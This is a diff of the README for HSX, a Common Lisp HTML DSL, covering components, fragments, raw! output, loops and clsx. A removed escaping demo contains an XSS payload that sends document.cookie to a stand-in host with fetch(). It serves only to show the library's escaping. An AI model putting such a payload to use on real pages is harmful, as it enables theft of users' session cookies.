@@ -1,16 +1,17 @@
-# HSX – Hypertext S-expression
+# HSX – HTML S-expression
 
-**HSX** is a simple and powerful HTML generation library for Common Lisp, inspired by JSX. It allows you to write HTML using native Lisp syntax.
+HSX is a declarative, component-oriented HTML DSL for Common Lisp.
+It lets you describe HTML structures and reusable components directly in Lisp, safely render them to HTML strings, and seamlessly integrate with your web applications.
 
-[Practical usage example](https://github.com/skyizwhite/website)
+→ [Example Project](https://github.com/skyizwhite/website)
 
-> 🚧 **BETA NOTICE:**  
-> This library is still in early development. APIs may change.  
-> See [release notes](https://github.com/skyizwhite/hsx/releases) for details.
+---
 
-## ⚙️ How HSX Works
+## How It Works
 
-Every tag or component inside an `(hsx ...)` form is transformed into a Lisp expression of the form:
+HSX translates Lisp S-expressions into HTML by expanding them into calls to `create-element`.
+
+Each tag or component inside an `(hsx ...)` form becomes:
 
 ```lisp
 (create-element type props children)
@@ -23,25 +24,24 @@ For example:
   (article :class "container"
     (h1 "Title")
     (p "Paragraph")
-    (~share-button :service :x))
+    (~share-button :service :x)))
 ```
-Is internally transformed (by macro expansion) into:
+
+Expands into:
 
 ```lisp
 (create-element :article
                 (list :class "container")
-                (list (create-element :h1
-                                      (list)
-                                      (list "Title"))
-                      (create-element :p
-                                      (list)
-                                      (list "Paragraph"))
+                (list (create-element :h1 nil (list "Title"))
+                      (create-element :p nil (list "Paragraph"))
                       (create-element #'~share-button
                                       (list :service :x)
-                                      (list))))
+                                      nil)))
 ```
 
-## 🚀 Quick Example
+---
+
+## Quick Example
 
 ```lisp
 (hsx
@@ -50,7 +50,7 @@ Is internally transformed (by macro expansion) into:
     (p "This is a simple paragraph.")))
 ```
 
-Generates:
+Renders to:
 
 ```html
 <div id="main" class="container">
@@ -59,100 +59,117 @@ Generates:
 </div>
 ```
 
-## 📝 Rendering
+---
 
-Use `render-to-string` to convert an HSX structure to a string of HTML:
+## Basic Usage
 
-```lisp
-(render-to-string
-  (hsx ...))
-``` 
+### Step 1: Create a Component
 
-## 🔐 Escaping text
+Components are defined using `defcomp`.
+They are simple Lisp functions that return HSX elements.
 
-All elements automatically escape special characters in content to prevent XSS and HTML injection:
-
-```lisp
-(hsx
-  (div "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))
-```
-Outputs:
-
-```html
-<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>
-```
-
-Use the special tag `raw!` to inject trusted, unescaped HTML:
+Component names must start with `~` and props should be declared with `&key` and/or `&rest`.
+The special `children` key automatically receives any nested elements.
 
 ```lisp
-(hsx
-  (article (raw! "HTML text here ..."))
+(defcomp ~button (&key href class children)
+  (hsx
+    (a :href href :class (clsx "btn" class)
+      children)))
 ```
 
-## 🧩 Fragments
+### Step 2: Combine Components
 
-Use `<>` tag to group multiple sibling elements without wrapping them in a container tag:
-
-```lisp
-(hsx
-  (<>
-    (p "One")
-    (p "Two")))
-```
-
-Outputs:
-
-```html
-<p>One</p>
-<p>Two</p>
-```
-
-Note: `raw!` tag is a fragment that disables HTML escaping for its children.
-
-## 🧱 Components
-
-Define reusable components using `defcomp` macro. Component names must start with `~`.
-
-*Keyword-style*
+HSX allows composition of components just like JSX.
 
 ```lisp
 (defcomp ~card (&key title children)
   (hsx
     (div :class "card"
       (h2 title)
-      children)))
-```
+      (div :class "content"
+        children))))
 
-*Property-list style*
-
-```lisp
-(defcomp ~card (&rest props)
+(defparameter *view*
   (hsx
-    (div :class "card"
-      (h2 (getf props :title))
-      (getf props :children))))
+    (div :class "container"
+      (~card :title "Hello"
+        (~button :href "/start" :class "primary"
+          "Get Started"))
+      (~card :title "Docs"
+        (p "Read the documentation to learn more.")))))
 ```
 
-### Usage
+### Step 3: Render to HTML
+
+Use `render-to-string` to produce a full HTML string.
+Pass `:pretty t` for indented, human-readable output.
 
 ```lisp
-(hsx
-  (~card :title "Hello"
-    (p "This is a card.")))
+(render-to-string *view* :pretty t)
 ```
 
-Outputs:
+Output:
 
 ```html
-<div class="card">
-  <h2>Hello</h2>
-  <p>This is a card.</p>
+<div class="container">
+  <div class="card">
+    <h2>Hello</h2>
+    <div class="content">
+      <a href="/start" class="btn primary">Get Started</a>
+    </div>
+  </div>
+  <div class="card">
+    <h2>Docs</h2>
+    <div class="content">
+      <p>Read the documentation to learn more.</p>
+    </div>
+  </div>
 </div>
 ```
 
-## 🧬 Logic and Interpolation
+---
 
-You can freely embed Lisp expressions, conditionals, and loops inside HSX forms:
+## Fragments
+
+### `<>` — Fragment
+
+Combine multiple elements without creating an extra parent tag.
+
+```lisp
+(hsx
+  (<>
+    (li "One")
+    (li "Two")))
+```
+
+→
+
+```html
+<li>One</li>
+<li>Two</li>
+```
+
+Fragments are useful when returning multiple sibling elements from a component.
+
+### `raw!` — Raw Fragment
+
+HSX automatically escapes unsafe characters in text and attribute values to prevent injection attacks.
+If you need to insert raw, unescaped HTML, you can do so — but use it only with trusted content, as it disables automatic escaping and may expose security risks.
+
+```lisp
+(hsx
+  (script (raw! "alert('unsafe if user-generated!')")))
+```
+
+---
+
+## Expressions and Logic
+
+You can embed any Lisp expression directly inside an HSX form.
+Since HSX is just Lisp syntax, you can use if, when, loop, or any other macro to build dynamic content.
+
+### Conditional Rendering
 
 ```lisp
 (hsx
@@ -162,20 +179,40 @@ You can freely embed Lisp expressions, conditionals, and loops inside HSX forms:
         (hsx (p "Low!")))))
 ```
 
-Or loop:
+### Loop Rendering
 
 ```lisp
 (hsx
   (ul
-    (loop :for item :in todo-list :collect
-      (hsx (li item))))))
+    (loop :for item :in items :collect
+      (hsx (li item)))))
 ```
 
-## Utils
+### Dynamic Props
 
-- `(clsx &rest strs)`: A utility function for constructing class strings conditionally. It removes `nil` from the string list, then joins the remaining strings with spaces.
+HSX supports both inline plist props and dynamic plist props.
 
-## 📄 License
+```lisp
+(let ((props '(:class "btn" :href "/")))
+  (hsx (a props "Dynamic Link")))
+```
+
+---
+
+## Utilities
+
+### `clsx`
+
+Utility for building class strings conditionally.
+Removes `nil` and joins the remaining strings with spaces.
+
+```lisp
+(clsx "btn" nil "primary")
+;; => "btn primary"
+```
+---
+
+## License
 
 MIT License
 
